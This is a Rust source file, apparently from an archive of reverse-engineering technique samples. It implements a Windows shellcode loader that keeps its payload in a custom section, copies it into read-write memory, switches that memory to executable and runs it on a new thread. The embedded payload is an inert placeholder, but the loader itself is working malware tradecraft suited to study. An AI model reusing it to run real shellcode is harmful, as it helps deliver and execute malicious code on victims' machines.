/*
    Shellcode Loader
    Archive of Reversing.ID

    storing payload as separate section

Compile:
    $ cargo build

Technique:
    - allocation: VirtualAlloc
    - writing:    n/a
    - permission: VirtualProtect
    - execution:  unsafe call to function pointer
*/

use std::{mem, ptr};
use winapi::um::{
    errhandlingapi::GetLastError,
    memoryapi::{VirtualAlloc, VirtualFree, VirtualProtect},
    minwinbase::LPTHREAD_START_ROUTINE,
    processthreadsapi::CreateThread,
    synchapi::WaitForSingleObject,
    winbase::INFINITE,
    winnt::{
        MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, 
        PAGE_READWRITE, PAGE_EXECUTE_READ
    },
};

// todo: can we change the permission?
// shellcode storage in new executable section
#[used]
#[link_section = ".code"]
static mut PAYLOAD: [u8; 4] = [0x90, 0x90, 0xCC, 0xC3];

fn main() {
    let mut old_protect = PAGE_READWRITE;

    unsafe {
        // allocate memory buffer for payload as READ-WRITE (no executable)
        let runtime = VirtualAlloc(
            ptr::null_mut(),
            PAYLOAD.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );

        if runtime.is_null() {
            println!("[-] unable to allocate");
            return;
        }

        // copy payload to the buffer
        ptr::copy(PAYLOAD.as_ptr(), runtime.cast(), PAYLOAD.len());
        
        // make buffer executable (R-X)
        let retval = VirtualProtect (
            runtime,
            PAYLOAD.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect
        );

        if retval != 0 {
            let mut tid = 0;
            let ep: LPTHREAD_START_ROUTINE = mem::transmute(runtime);

            let th_shellcode = CreateThread (
                ptr::null_mut(),
                0,
                ep,
                ptr::null_mut(),
                0,
                &mut tid
            );

            let status = WaitForSingleObject(th_shellcode, INFINITE);
            if status != 0 {
                let error = GetLastError();
                println!("Error: {}", error.to_string());
            }
        }

        VirtualFree(runtime, PAYLOAD.len(), MEM_RELEASE);
    }
}